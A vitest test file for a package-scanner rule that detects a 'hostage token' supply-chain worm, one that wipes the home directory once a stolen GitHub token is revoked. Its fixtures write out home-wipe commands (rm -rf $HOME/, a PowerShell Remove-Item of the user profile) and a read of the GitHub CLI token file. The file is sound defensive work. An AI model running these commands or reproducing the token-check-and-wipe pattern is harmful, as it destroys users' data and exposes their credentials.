/**
 * tensorlake@0.5.144 (Oct 2026) — Mini Shai-Hulud with a "hostage token":
 * a monitor re-checks the stolen GitHub token every minute and wipes the
 * home directory once it is revoked. The fixture replays the published shapes.
 */
import { describe, it, expect } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { hostageToken, REVOKE_WARNING } from '../../../src/scan/rules/hostage-token.js';
import { credentialFileAccess } from '../../../src/scan/rules/credential-file-access.js';
import type { PackageMeta } from '../../../src/scan/types.js';

const FIXTURES = path.resolve(__dirname, '../../fixtures/node_modules');

function metaFor(name: string): PackageMeta {
  const pkgPath = path.join(FIXTURES, name);
  const raw = require(path.join(pkgPath, 'package.json'));
  return { name: raw.name, version: raw.version, path: pkgPath, raw };
}

function tmpPkg(files: Record<string, string>, raw: Record<string, unknown> = {}): PackageMeta {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cw-hostage-'));
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), body);
  }
  return { name: 'tmp-pkg', version: '1.0.0', path: dir, raw };
}

describe('Rule 7: hostage_token', () => {
  it('flags the known-compromised tensorlake@0.5.144 as CRITICAL', () => {
    const findings = hostageToken.check(metaFor('tensorlake')) as ReturnType<typeof hostageToken.check> & any[];
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe('critical');
    expect(findings[0]!.description).toContain(REVOKE_WARNING);
  });

  it('does NOT flag other tensorlake versions', () => {
    const meta = { ...metaFor('tensorlake'), version: '0.5.145' };
    expect(hostageToken.check(meta)).toEqual([]);
  });

  it('flags the token-check + home-wipe dead-man switch', () => {
    const findings = hostageToken.check(metaFor('fake-hostage-token')) as any[];
    const wipe = findings.find((f) => f.description.includes('dead-man switch'));
    expect(wipe?.severity).toBe('critical');
    expect(wipe?.file).toContain('monitor.js');
    expect(wipe?.description).toContain('Do NOT revoke');
  });

  it('flags the gh-token-monitor indicator', () => {
    const findings = hostageToken.check(metaFor('fake-hostage-token')) as any[];
    expect(findings.some((f) => f.description.includes('gh-token-monitor') && f.file?.includes('persist.js'))).toBe(true);
  });

  it('flags an install-time Bun bootstrap as HIGH', () => {
    const findings = hostageToken.check(metaFor('fake-hostage-token')) as any[];
    const bun = findings.find((f) => f.description.includes('Bun'));
    expect(bun?.severity).toBe('high');
  });

  it('does NOT flag a clean package', () => {
    expect(hostageToken.check(metaFor('fake-clean-pkg'))).toEqual([]);
  });

  it('does NOT flag a GitHub client that cleans a cache dir under home', () => {
    const meta = tmpPkg({
      'index.js': [
        "fetch('https://api.github.com/user', { headers: { Authorization: 'token ' + t } });",
        "exec('rm -rf ~/.cache/my-tool');",
        "fs.rmSync(path.join(os.homedir(), '.cache'), { recursive: true });",
      ].join('\n'),
    });
    expect(hostageToken.check(meta)).toEqual([]);
  });

  it('does NOT flag a home wipe with no token check', () => {
    const meta = tmpPkg({ 'reset.sh.js': "exec('rm -rf $HOME/')" });
    expect(hostageToken.check(meta)).toEqual([]);
  });

  it('catches the PowerShell profile wipe', () => {
    const meta = tmpPkg({
      'monitor.js': [
        "const r = await fetch('https://api.github.com/user', { headers: { Authorization: `token ${t}` } });",
        "if (r.status === 401) ps('Remove-Item -Path $env:USERPROFILE -Recurse -Force');",
      ].join('\n'),
    });
    const findings = hostageToken.check(meta) as any[];
    expect(findings[0]?.severity).toBe('critical');
  });

  it('ignores a Bun download in a package with no install scripts', () => {
    const meta = tmpPkg({ 'docs.js': "const u = 'https://bun.sh/install';" });
    expect(hostageToken.check(meta)).toEqual([]);
  });
});

describe('credential_file_access: GitHub CLI token', () => {
  it('flags a read of ~/.config/gh/hosts.yml', () => {
    const meta = tmpPkg({ 'steal.js': "fs.readFileSync(path.join(home, '.config/gh/hosts.yml'))" });
    const findings = credentialFileAccess.check(meta) as any[];
    expect(findings[0]?.description).toContain('GitHub CLI token');
  });
});
